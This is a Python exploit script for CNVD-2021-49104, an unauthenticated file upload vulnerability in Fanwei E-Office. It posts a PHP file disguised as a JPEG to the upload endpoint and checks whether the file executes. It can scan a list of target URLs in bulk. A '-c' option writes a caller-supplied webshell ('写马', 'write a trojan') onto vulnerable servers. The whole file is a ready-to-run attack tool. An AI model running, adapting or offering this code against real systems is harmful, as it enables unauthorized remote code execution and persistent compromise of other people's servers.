# -*- coding -*-
import requests
import colorama
import argparse
from colorama import *


def title():
    print(colorama.Fore.YELLOW + '|-----------------------------------------------------------|')
    print(colorama.Fore.YELLOW + '| 泛微E-Office文件上传漏洞CNVD-2021-49104 文件上传:By k3rwin|')
    print(colorama.Fore.YELLOW + '|-----------------------------------------------------------|')
    print(colorama.Fore.YELLOW + '| use: python3 FanWeiOffice.py -u https://ip:8088 单个url   |')
    print(colorama.Fore.YELLOW + '| use: python3 FanWeiOffice.py -r url.txt  批量验证url      |')
    print(colorama.Fore.YELLOW + '|-----------------------------------------------------------|')
                

def exp(urllist, content):
    url = urllist + '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    content = '<?php echo "vuln";?>' + content
    files = {'Filedata':('Filedata.php',content,'image/jpeg')}
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
    'Referer': 'https://www.baidu.com'
    }
    exp = requests.post(url=url,headers=headers,files=files)


def Va(urllist,flag):
    url = urllist + '/images/logo/logo-eoffice.php'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
    'Referer': 'https://www.baidu.com'
    }
    va = requests.get(url, headers=headers)
    text = va.text
    if flag:
        if "vuln" in text:
            print(colorama.Fore.RED  + '+----------------漏洞存在-------------------------+')
            print(colorama.Fore.RED  + '+漏洞存在，上传的文件路径为:'+ url + '     可使用 -c 写马+')
        else:
            print(colorama.Fore.YELLOW  + '----------------漏洞不存在--------------------------')
    else:
        if "vuln" in text:
            print(colorama.Fore.RED  + '+漏洞存在，上传的文件路径为:'+ url + '      可使用 -c 写马+')
        
            

def files(file,content):
    with open(file,'r') as f:
        urls = f.readlines()
        for url in urls:
            url = url.strip().split('\n')[0]
            exp(url, content)
            Va(url, 0)



def get_args():
    parser = argparse.ArgumentParser(description="命令行传入url参数，-u 指定单个地址，-r 指定批量地址，-c 写马")
    parser.add_argument('-u', type=str, help='单个url地址')
    parser.add_argument('-r', type=str, help='url文件列表')
    parser.add_argument('-c', type=str, default='', help='写马，参数为木马内容')
    args = parser.parse_args()
    url = args.u
    file = args.r
    content = args.c
    if url:
        exp(url, content)
        Va(url, 1)
    elif file:
        files(file, content)     
    else:
        print('please set -u or -r,use python3 FanWeiOffice.py -h')
                

if __name__ == '__main__':
    title()
    get_args()